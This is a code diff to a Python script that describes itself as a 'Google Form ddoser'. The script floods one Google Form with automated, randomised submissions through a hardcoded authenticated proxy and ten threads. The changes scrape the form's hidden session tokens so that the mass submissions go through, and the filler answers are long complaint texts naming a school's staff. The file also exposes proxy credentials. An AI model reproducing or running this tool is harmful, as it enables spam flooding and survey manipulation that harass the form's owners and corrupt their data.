@@ -5,6 +5,7 @@ import requests
 import random
 
 from LogPython import LogManager
+from bs4 import BeautifulSoup
 import requests
 LogManager = LogManager()
 import threading
@@ -20,7 +21,7 @@ from http.client import responses
 proxies = {"https":"https://cool-leaf-5479p1000:QAKyMxtT@167.99.195.184:5050"}
 
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 Edg/86.0.622.43'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4240.80 Safari/537.36 Edg/84.0.622.43'
 }
 
 _first_answer_ = 'Зачем задавать такой вопрос, если проблема в индивидуальном расписании? - при индивидуальном расписании пропадали уроки, на каждом третьем уроке учеников больше чем посадочных мест, по большей мере хаотичное распределение по группам, например, информатика, физика и русский (когда распределение по уровню было). Даже непонятно, было ли распределение по уровню знаний по некоторым предметам. Отсутствие возможности перейти в другую группу, несмотря на то, что обещали, что это не будет проблемой. По словам преподавателей, чтобы перейти в группу с якобы более высоким уровнем преподавания, нужно решать дополнительное задание, которое будет (момент времени, когда оно должно там появиться естественно не оговаривается) в гугл классе этой группы. К слову, задания в гугл классе нет и, как я думаю, не будет. Так же интересует вопрос с окнами посреди школьного дня, пустые промежутки между седьмым и восьмым уроком, вовремя которых нужно заниматься непонятно чем. Из-за этих бесполезных промежутков ученики возвращаются домой минимум на два часа позже, когда могли вернуться домой и спокойно заняться своими делами, вместо этого они вынуждены находиться в школе и буквально "убивать время". Не говоря о том, что в некоторых случаях на уроке было только половина учеников, а вторая половина шла не по расписанию и из-за этого фактически пропадали уроки, можно сказать о том, что такой урок как физкультура полностью пропал из расписания и его по факту не существует как предмета уже месяц. Недавно поднялся вопрос о том, что группа Регины Рашидовны по геометрии не может написать акр просто потому, что для него нужно два подряд идущих урока, которые у нас есть только заочно. Казалось бы, Аветис Грачевич, как классный руководитель и директор, мог отпустить  учеников с одного, максимум с двух уроков, чтобы они без проблем написали акр. Я бы не писал(а) об этом инциденте, если бы все произошло так, как я предполагал(а), но акр эта группа так и не написала, поэтому пришлось высказать это. Короче говоря, в пуме царит хаос и беспорядок, противоположно словам директора в этой школе полнейшее отсутствие дисциплины и порядка. Не буду затрагивать тему некой иерархии в пуме, которая сформировалась еще в прошлом году и не распалась до сих пор. В некоторый момент времени возникло такое ощущение, что в пуме все делается в последний момент и на скорую руку. Никакой речи о планировании идти не может.'
@@ -31,7 +32,7 @@ _third_answer_ = 'Если вы дочитали до этого момента,
 
 random_num = [1, 5]
 
-_link = 'https://docs.google.com/forms/d/e/1FAIpQLSdkVj0GVp_ZMV1gab7V7UP0Ct-aij-A4juxI3_roq3sukwR-A/viewform?usp=sf_link'
+_link = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdkVj0GVp_ZMV1gab7V7UP0Ct-aij-A4juxI3_roq3sukwR-A/formResponse'
 
 jojo = random.choice(random_num)
 
@@ -118,17 +119,42 @@ def SetInput(a):
     LogManager.info('writing complete')
     
     open('dop.js', 'w', encoding = "utf-8").write("module.exports.Getter = function Getter() {\n" + resp + "]" + "\nreturn FB_PUBLIC_LOAD_DATA_;}")
+   
+def OtherArgsGetter():
+    _resp = requests.get(_link).text
+    
+    soup = BeautifulSoup(_resp, "lxml")
+    
+    fvv = soup.find("input", {
+        "name" : "fvv"
+    }).attrs['value']
+    
+    draftResponse = soup.find("input", {
+        "name" :"draftResponse"
+    }).attrs['value']
+    
+    pageHistory = soup.find("input", {
+        "name" : "pageHistory"
+    }).attrs['value']
+    
+    fbzx = soup.find("input", {
+        "name" : "fbzx"
+    }).attrs['value']
+    
+    return fvv, draftResponse, pageHistory, fbzx
         
 def RaidComporator(ServeList):
     res = dict()
 
     for i in ServeList:
         res[i['id']] = random.choice(i['value'])
+      
+    fvv, draftResponse, pageHistory, fbzx = OtherArgsGetter()
         
-    res["fvv"] = "1"
-    res["draftResponse"] = '[null,null,"-1322386903815409528"]'
-    res["pageHistory"] = "0"
-    res["fbzx"] = "-1322386903815409528"    
+    res["fvv"] = fvv
+    res["draftResponse"] = draftResponse
+    res["pageHistory"] = pageHistory
+    res["fbzx"] = fbzx   
                   
     return res          
                   
@@ -168,7 +194,8 @@ genders = ['Agender', 'Androgyne', 'Androgynous', 'Bigender', 'Cis', 'FTM', 'Gen
 @click.option('--raid', default = 3, help = 'Start ddos any google form`s link')
 @click.option('--resp', default = "text", help = "Get response || Post response")
 @click.option('--log', default = "jojo", help = "Any actions with logs")
-def starter(link, resp, raid, log):                                              
+@click.option('--test', default = "OK", help = "For testings commands")
+def starter(link, resp, raid, log, test):                                              
     
     """Google Form`s ddoser script`s help`s command:\\//"""
     
@@ -201,6 +228,8 @@ def starter(link, resp, raid, log):
         if log == "cls":
             with open("LogPython_info.log", "w") as log_file:
                 log_file.write(" ")
+        if test == "jojo":
+            Test()
         if raid == 1:
 
             print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
@@ -236,7 +265,7 @@ def start1():
     _ = list()
     
     for i in range(10):
-        thr = threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo, i), deamon = True)
+        thr = threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo, i), daemon = False)
         thr.start()    
         _.append(thr)
         
